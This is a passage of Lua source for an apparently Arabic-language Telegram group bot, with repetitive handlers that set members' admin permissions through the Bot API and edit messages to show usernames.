local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=false'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=True'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=false'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addadmintrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadmintrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=true' 
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfotrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfotrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..'&can_change_info=True' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=True' ..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/VNOusertrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/VNOusertrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=True' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=True' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinktrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinktrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=True' ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end


if Text and Text:match('amr@(%d+)/user@(%d+)/addadminfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadminfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
if manage then
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=false'
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
end
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfofalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfofalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. '&can_change_info=false' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=false'..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/VNOuserfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/VNOuserfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=false' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=false' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinkfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinkfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=false'  ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text == '/@jjjx33' then
local Teext =[[
@jjjx33
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Xccp' then
local Teext =[[
@Xccp
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Lj_llIll' then
local Teext =[[
@Lj_llIll
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/pivsn' then
local Teext =[[
@pivsn
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/hide' then
local Teext =[[
تم اخفاء الاوامر
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/k1op' then
local Teext =[[
@k1op
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Q10d' then
local Teext =[[
@Q10d
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/llll_iiij' then
local Teext =[[
@llll_iiij
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Xjljlj' then
local Teext =[[
@Xjljlj
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Xjak' then
local Teext =[[
@Xjak
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/jk1bn' then
local Teext =[[
@jk1bn
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/A0op' then
local Teext =[[
@A0op
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/vip_iij' then
local Teext =[[
@vip_iij
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/YtIIIl' then
local Teext =[[
@YtIIIl
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/iii_llij' then
local Teext =[[
@iii_llij
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/vbvy' then
local Teext =[[
@vbvy
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/hjljilj' then
local Teext =[[
@hjljilj
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Diiolk' then
local Teext =[[
@Diiolk
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Bi01j' then
local Teext =[[
@Bi01j
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/frrili' then
local Teext =[[
@frrili
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end
if Text == '/Xcvb' then
local Teext =[[
@Xcvb
]]
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
end

if Text == '/Dlik' then
local Teext =[[
@Dlik
]]
